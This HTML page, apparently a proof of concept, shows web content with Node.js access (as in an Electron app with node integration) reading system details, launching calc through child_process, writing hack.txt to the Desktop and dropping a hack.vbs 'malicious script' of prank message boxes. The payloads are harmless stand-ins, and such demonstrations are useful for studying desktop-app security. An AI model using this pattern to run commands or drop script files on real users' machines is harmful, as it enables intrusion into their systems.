<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>官网</title>
  <style>
    html{
      background-color: #fff;
      color: #333;
    }
  </style>
</head>
<body>
  <button onclick="getSysInfo()">获取系统信息</button>
  <button onclick="runBash()">运行指定程序</button>
  <button onclick="writeFile()">写入指定文件</button>
  <button onclick="openDir()">打开指定目录</button>
  <button onclick="writeAndRun()">运行恶意脚本</button>
  <div id="info"></div>
  <script>
    let desktop = ''
    function getSysInfo () {
      const os = require('os')
      const html = `
        <p>操作系统: ${os.version()}  ${os.release()}版本  ${os.arch()}位</p>
        <p>CPU: ${os.cpus()[0].model}</p>
        <p>用户目录: ${os.homedir}</p>
        <p>缓存目录: ${os.tmpDir()}</p>
      `
      document.querySelector('#info').innerHTML = html
    }

    function runBash () {
      const bash = require('child_process')
      bash.exec('calc')
    }

    function writeFile () {
      const fs = require('fs')
      const os = require('os')
      const path = require('path')
      const homedir = os.homedir()
      desktop = path.join(homedir, 'Desktop')
      fd = fs.openSync(desktop + '\\hack.txt', 'w')
      fs.writeSync(fd, 'hack js')
    }

    function openDir () {
      const bash = require('child_process')
      bash.exec(`explorer.exe /select,"${desktop}\\hack.txt"`)
    }

    function writeAndRun () {
      const vbs = `
      MsgBox "ERROR! ERROR! ERROR! ERROR! ERROR!"
      MsgBox "333"
      MsgBox "222"
      MsgBox "111"
      MsgBox "BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM!"
      `
      const fs = require('fs')
      fd = fs.openSync(desktop + '\\hack.vbs', 'w')
      fs.writeSync(fd, vbs, 0, 'ANSI')
    }
  </script>
</body>
</html>
